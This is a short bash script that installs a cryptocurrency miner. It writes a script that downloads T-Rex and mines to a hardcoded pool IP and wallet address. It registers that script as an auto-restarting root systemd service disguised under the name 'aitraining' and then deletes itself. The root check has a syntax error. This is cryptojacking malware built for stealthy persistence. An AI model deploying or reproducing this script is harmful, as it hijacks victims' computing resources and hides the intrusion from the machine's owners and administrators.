#!/bin/bash

# Define variables
SERVICE_NAME="aitraining"
SCRIPT_PATH="/root/${SERVICE_NAME}_script.sh"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Check for root privileges
if [ "$(id -u)" -ne 0; then
  exit 1
fi

# Create the miner script
cat <<'EOF' > "$SCRIPT_PATH"
#!/bin/bash
wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
tar xvzf t-rex-0.26.8-linux.tar.gz
./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
EOF

# Set permissions for the script
chmod 700 "$SCRIPT_PATH"

# Create the systemd service
cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=AITR
After=network.target

[Service]
ExecStart=$SCRIPT_PATH
WorkingDirectory=/root
User=root
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd, enable, and start the service
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"

# Delete the script itself
rm -- "$0"
